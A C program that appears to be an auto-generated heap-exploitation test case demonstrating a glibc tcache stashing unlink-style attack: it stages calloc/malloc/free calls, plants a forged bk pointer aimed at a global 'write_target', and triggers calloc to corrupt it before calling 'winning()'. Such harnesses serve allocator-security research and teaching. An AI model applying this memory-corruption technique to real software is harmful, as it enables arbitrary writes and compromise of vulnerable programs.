#include <malloc.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

typedef struct __attribute__((__packed__)) {
	uint64_t * global_var;
} controlled_data;

typedef struct __attribute__((__packed__)) {
	uint64_t data[0x20];
} symbolic_data;

void winning(void) {
	puts("You win!");
}

size_t write_target[4] = {0, 0, 0, 0};
size_t offset;
size_t header_size;
size_t mem2chunk_offset;
size_t malloc_sizes[9] = {0x420, 0x20, 0x3c0, 0x100, 0x420, 0x80, 0x3c0, 0x100, 0x50};
size_t fill_sizes[9];
size_t overflow_sizes[1] = {0x8};
size_t arw_offsets[0];
size_t bf_offsets[0];
controlled_data __attribute__((aligned(16))) ctrl_data_0;
controlled_data __attribute__((aligned(16))) ctrl_data_1;
controlled_data __attribute__((aligned(16))) ctrl_data_2;
controlled_data __attribute__((aligned(16))) ctrl_data_3;
controlled_data __attribute__((aligned(16))) ctrl_data_4;
controlled_data __attribute__((aligned(16))) ctrl_data_5;
controlled_data __attribute__((aligned(16))) ctrl_data_6;
controlled_data __attribute__((aligned(16))) ctrl_data_7;
controlled_data __attribute__((aligned(16))) ctrl_data_8;

int main(void) {
	char *t1;
	void *dummy_chunk = malloc(0x200);
	free(dummy_chunk);

	// Allocation
	for(int i=0; i<5; i++){
		t1 = calloc(1, 0x50);
		free(t1);
	}

	// s1 = malloc(0x420);
	ctrl_data_0.global_var = malloc(0x420);
	// ctrl_data_0.global_var = malloc(malloc_sizes[0]);
	for (int i=0; i < fill_sizes[0]; i+=8) {
		read(0, ((uint8_t *)ctrl_data_0.global_var)+i, 8);
	}
	// malloc(0x20);
	ctrl_data_1.global_var = malloc(0x20);
	// ctrl_data_1.global_var = malloc(malloc_sizes[1]);
	for (int i=0; i < fill_sizes[1]; i+=8) {
		read(0, ((uint8_t *)ctrl_data_1.global_var)+i, 8);
	}
	// free(s1);
	free(ctrl_data_0.global_var);
	// malloc(0x3c0);
	ctrl_data_2.global_var = malloc(0x3c0);
	// ctrl_data_2.global_var = malloc(malloc_sizes[2]);
	for (int i=0; i < fill_sizes[2]; i+=8) {
		read(0, ((uint8_t *)ctrl_data_2.global_var)+i, 8);
	}
	// malloc(0x100);
	ctrl_data_3.global_var = malloc(0x100);
	// ctrl_data_3.global_var = malloc(malloc_sizes[3]);
	for (int i=0; i < fill_sizes[3]; i+=8) {
		read(0, ((uint8_t *)ctrl_data_3.global_var)+i, 8);
	}
	
	
	// s2 = malloc(0x420);
	ctrl_data_4.global_var = malloc(0x420);
	// ctrl_data_4.global_var = malloc(malloc_sizes[4]);
	for (int i=0; i < fill_sizes[4]; i+=8) {
		read(0, ((uint8_t *)ctrl_data_4.global_var)+i, 8);
	}
	// malloc(0x80);
	ctrl_data_5.global_var = malloc(0x80);
	// ctrl_data_5.global_var = malloc(malloc_sizes[5]);
	for (int i=0; i < fill_sizes[5]; i+=8) {
		read(0, ((uint8_t *)ctrl_data_5.global_var)+i, 8);
	}
	// free(s2);
	free(ctrl_data_4.global_var);
	// malloc(0x3c0);
	ctrl_data_6.global_var = malloc(0x3c0);
	// ctrl_data_6.global_var = malloc(malloc_sizes[6]);
	for (int i=0; i < fill_sizes[6]; i+=8) {
		read(0, ((uint8_t *)ctrl_data_6.global_var)+i, 8);
	}
	// malloc(0x100);
	ctrl_data_7.global_var = malloc(0x100);
	// ctrl_data_7.global_var = malloc(malloc_sizes[7]);
	for (int i=0; i < fill_sizes[7]; i+=8) {
		read(0, ((uint8_t *)ctrl_data_7.global_var)+i, 8);
	}

	*(uint64_t*)(((char *)ctrl_data_4.global_var+0x3c0)+0x18) = (uint64_t)(&write_target)-0x10;
	// offset = mem2chunk_offset;
	// read(3, ((char *) ctrl_data_4.global_var)+0x3c0+0x18, overflow_sizes[0]);
	calloc(1, 0x50);

	// uint64_t *r = (uint64_t*)malloc(0x50);
	// r[0] = 0xaa;
	// r[1] = 0xbb;
	// r[2] = 0xcc;
	// r[3] = 0xdd;
	ctrl_data_8.global_var = malloc(0x50);
	// ctrl_data_8.global_var = malloc(malloc_sizes[8]);
	for (int i=0; i < fill_sizes[8]; i+=8) {
		read(0, ((uint8_t *)ctrl_data_8.global_var)+i, 8);
	}
	

	winning();
}


